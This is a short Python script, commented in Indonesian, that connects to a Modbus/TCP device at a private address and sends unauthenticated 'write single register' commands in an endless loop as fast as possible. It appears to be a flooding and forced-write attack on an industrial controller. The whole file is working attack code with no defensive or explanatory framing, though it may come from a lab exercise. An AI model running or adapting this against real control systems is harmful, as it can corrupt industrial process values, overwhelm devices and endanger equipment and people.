#!/usr/bin/env python3
import socket
import random

SLAVE_IP = "192.168.21.209"
REGISTER = 1024

def build_write(addr, value):
    return bytes([0x00,0x00,0x00,0x00,0x00,0x06,0x01,0x06,
                  (addr>>8)&0xFF, addr&0xFF,
                  (value>>8)&0xFF, value&0xFF])

# Buka satu koneksi dan kirim secepat mungkin
s = socket.socket()
s.connect((SLAVE_IP, 502))
count = 0
while True:
    val = 1212
    s.send(build_write(REGISTER, val))
    count += 1
    if count % 10000 == 0:
        print(f"{count} paket terkirim")